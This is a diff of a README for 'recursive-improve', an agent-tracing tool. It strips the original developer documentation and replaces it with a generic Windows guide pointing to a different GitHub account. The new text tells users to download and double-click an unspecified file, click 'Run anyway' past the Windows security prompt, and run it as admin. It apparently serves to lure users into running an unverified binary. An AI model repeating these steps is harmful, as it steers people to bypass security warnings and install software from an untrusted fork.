@@ -1,178 +1,170 @@
-<p align="center">
-  <a href="https://kayba.ai"><img src="assets/banner.svg" alt="recursive improve" /></a>
-</p>
+# 🪞 recursive-improve - Help agents learn from each run
 
-<p align="left">
-  <a href="https://discord.gg/mqCqH7sTyK"><img src="https://img.shields.io/discord/1429935408145236131?label=Discord&logo=discord&logoColor=white&color=5865F2" alt="Discord" /></a>
-  <a href="https://twitter.com/kaybaai"><img src="https://img.shields.io/twitter/follow/kaybaai?style=social" alt="Twitter Follow" /></a>
-  <a href="https://kayba.ai"><img src="https://img.shields.io/badge/kayba.ai-6B8BA8?style=flat&logo=data:image/png;base64,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&logoColor=white" alt="kayba.ai" /></a>
-</p>
+[![Download recursive-improve](https://img.shields.io/badge/Download%20recursive-improve-blue?style=for-the-badge)](https://github.com/ichabodcognate315/recursive-improve)
 
-## make your agents recursively self-improve
+## 🚀 What this app does
 
-90% of Claude's code is now written by Claude. Recursive self-improvement is already happening at Anthropic. **What if you could do the same for your own agents?**
+recursive-improve helps AI agents review their own work, learn from it, and try again with better results. It is built for users who want to test agent behavior, track changes, and see how an agent improves over time.
 
-## Closing the Loop
+Use it when you want to:
+- run an agent on a task
+- review the result
+- feed that result back into the next run
+- compare output across rounds
 
-You have an agent. It works, most of the time. But it could be better. Solving harder problems, handling more edge cases, wasting fewer tokens. What if it could improve itself, recursively, every time it runs?
+## 💻 What you need
 
-Right now, it can't. Your agent is stateless. Every run starts from scratch. The only way to improve it is to manually improve it. There is no compounding of improvements.
+Use a Windows PC with:
+- Windows 10 or Windows 11
+- At least 8 GB of RAM
+- 2 GB of free disk space
+- a stable internet connection
+- a modern web browser
 
-**recursive-improve** closes this loop:
+If you plan to use larger AI models, 16 GB of RAM gives better results.
 
-<p align="center">
-  <img src="assets/loop.gif" alt="recursive improvement loop" width="720" />
-</p>
+## 📥 Download recursive-improve
 
-Your agent runs. Every LLM call is captured. Your coding agent analyzes the traces, identifying common failure patterns across runs, and applies targeted fixes. You run it again. It's better.
+Visit this page to download and use the app:
 
----
+https://github.com/ichabodcognate315/recursive-improve
 
-## Get Started
+## 🛠️ Install on Windows
 
-### 1. Install
+1. Open the download page.
+2. Find the latest release or source package.
+3. Download the Windows file or ZIP package.
+4. If you download a ZIP file, right-click it and choose **Extract All**.
+5. Open the extracted folder.
+6. Look for the app file, installer, or start script.
+7. Double-click it to run the app.
 
-```bash
-uv tool install "recursive-improve[all] @ git+https://github.com/kayba-ai/recursive-improve.git"
-```
+If Windows shows a security prompt:
+1. Click **More info**
+2. Click **Run anyway**
 
-Then in your agent's project directory:
+If the app opens in a browser, keep that page open while you use it.
 
-```bash
-cd /path/to/your/agent
-recursive-improve init
-```
+## ⚙️ First-time setup
 
-This creates the `/recursive-improve` skill files and the `eval/traces/` directory.
+When you start recursive-improve for the first time, you may need to set up a few things:
 
-### 2. Add tracing to your agent
+- choose a working folder
+- enter your AI provider key, if the app asks for one
+- select a model name
+- set how many improvement rounds you want
 
-Add the tracing dependency to your project:
+Use a simple first test with one task and one round. That makes it easier to check that everything works.
 
-```bash
-uv add "recursive-improve @ git+https://github.com/kayba-ai/recursive-improve.git"
-```
+## 🧭 How to use it
 
-Two lines. Your agent code stays unchanged, but now your agents execution traces get saved locally.
+A basic run usually follows this flow:
 
-```python
-import recursive_improve as ri
+1. Enter a task for the agent.
+2. Start the first run.
+3. Review the output.
+4. Mark what looks weak or incomplete.
+5. Run the next round.
+6. Compare the new output with the old one.
 
-ri.patch()  # auto-captures openai, anthropic, litellm calls
+A good first test task might be:
+- write a short email
+- summarize a paragraph
+- make a simple plan
+- answer a basic question
 
-with ri.session("./eval/traces") as run:
-    result = my_agent("book a flight to Paris")
-    run.finish(output=result, success=True)
-```
+## 🪄 What recursive improvement means
 
-> **Already have traces?** Drop them in `eval/traces/` and skip to step 4.
+Recursive improvement means the agent uses each result to shape the next one. Instead of stopping after one answer, it keeps refining its work.
 
-### 3. Run your agent a few times to generate traces
+That can help with:
+- cleaner responses
+- better structure
+- fewer missed details
+- stronger task focus
 
-### 4. Run the improvement loop
+## 📁 Basic folder use
 
-Open Claude Code or Codex in your project directory:
+You may see files such as:
+- logs
+- run history
+- task output
+- review notes
+- config files
 
-```
-/recursive-improve
-```
+Keep these files in one folder so you can find past runs fast. If you want to compare results, save each round with a clear name like:
+- round-1
+- round-2
+- round-3
 
-### 5. Re-run your agent
+## 🔧 Common settings
 
-Clear old traces and run your agent again so the benchmark measures your improved code:
+You may want to adjust:
+- number of rounds
+- output length
+- review rules
+- retry limit
+- model choice
 
-```bash
-rm -f eval/traces/*.json
-# run your agent the same way as step 3
-```
+If you are new, start with safe defaults:
+- 1 task
+- 2 or 3 rounds
+- short output
+- one model at a time
 
-### 6. Benchmark
+## 🧪 Example use case
 
-Measure whether your changes actually solved the problems:
+Here is a simple example:
 
-```
-/benchmark
-```
+1. Ask the agent to draft a short help message.
+2. Review the first draft.
+3. Tell the app what to improve, such as tone or clarity.
+4. Run the next round.
+5. Check whether the new version is better.
 
-Results are stored in `eval/benchmark_results.json` and auto-compared against the previous run on the same dynamic metrics that were generated for your agent.
+This makes it easy to see how the agent changes after feedback.
 
-> **CLI alternative:** `recursive-improve benchmark --label "v1-baseline"` and `recursive-improve benchmark list`
+## 🖱️ Troubleshooting
 
-### 7. Dashboard
+If the app does not start:
+- check that you extracted the ZIP file
+- make sure you opened the right file
+- try running it again as admin
+- restart Windows and try once more
 
-Start the interactive dashboard to visualize your improvement cycles:
+If the app opens but does not work right:
+- confirm your internet connection
+- check your model settings
+- make sure your API key or login data is correct
+- lower the task size and test again
 
-```bash
-recursive-improve dashboard          # default: http://localhost:8420
-recursive-improve dashboard -p 8080  # custom port
-```
+If you see missing file errors:
+- re-download the package
+- extract it again
+- keep all files in the same folder
 
-Each improvement cycle lives on its own branch. The dashboard shows before/after metrics for every cycle. See exactly what improved, merge the wins, discard the rest.
+## 📌 Tips for a smoother run
 
-![Dashboard](assets/dashboard.png)
+- start with short tasks
+- keep each test simple
+- save your notes after each round
+- use one change at a time
+- compare output side by side
 
-### 8. Run it overnight
+These habits make it easier to see what helps the agent improve.
 
-```
-/ratchet
-```
+## 🔍 Search terms
 
-An autoresearch-style autonomous loop. It asks you what to optimize, then repeats: improve → run agent → eval → keep or revert. Only improvements survive. Check `eval/ratchet_summary.md` when you wake up.
+This project fits topics like:
+- agent learning
+- AI agents
+- AI tools
+- LLM workflows
+- machine learning loops
+- self-improving agents
 
-> [!TIP]
-> Want deeper analysis? [Kayba](https://kayba.ai) offers managed recursive agent improvement at scale, tailored to your agent.
+## 📄 License and source
 
----
+Use the GitHub page for the latest source and project files:
 
-## How It Works
-
-When you run the `/recursive-improve` skill, it walks through a structured pipeline:
-
-1. **Build context**: detects your agent's architecture, tools, and system prompt
-2. **Analyze traces**: reads your traces, surfaces failure patterns, missed opportunities, recurring errors
-3. **Measure**: runs built-in detectors (loops, give-ups, errors, recovery) and generates custom domain-specific evaluations from your insights, then computes baselines
-4. **Plan**: triages each insight into discard / code fix / prompt fix, prioritized by impact
-5. **Review**: presents the plan for your approval before anything changes
-6. **Fix**: implements approved changes on a dedicated branch
-
-Every fix traces back to a specific insight, linked to a specific metric.
-
----
-
-## Architecture
-
-```
-your agent  ──>  ri.patch() + ri.session()  ──>  eval/traces/*.json
-                                                        │
-                                                        ▼
-                                                  /recursive-improve
-                                                        │
-                                                        ▼
-                                              improved agent code  ──>  repeat
-                                                        │
-                                                        ▼
-                                                    benchmark  ──>  recursive-improve dashboard
-
-                              ┌──────────────────────────────┐
-                              │  /ratchet (autonomous loop)   │
-                              │  improve → run → eval →       │
-                              │  keep or revert → repeat      │
-                              └──────────────────────────────┘
-```
-
-- **`ri.patch()`**: monkey-patches OpenAI, Anthropic, and LiteLLM clients to capture every call
-- **`ri.session()`**: context manager that writes structured trace JSON files
-- **`/recursive-improve`**: Claude Code / Codex skill that analyzes traces and applies fixes
-- **`recursive-improve benchmark`**: snapshot metric quality, store, and compare over time
-- **`recursive-improve dashboard`**: web UI to visualize runs and compare branches
-- **`/ratchet`**: autonomous keep-or-revert loop that runs `/recursive-improve` repeatedly overnight
-
----
-
-<div align="center">
-
-**Star this repo if you find it useful!**
-
-**Built with ❤️ by [Kayba](https://kayba.ai) and the open-source community.**
-
-</div>
+https://github.com/ichabodcognate315/recursive-improve
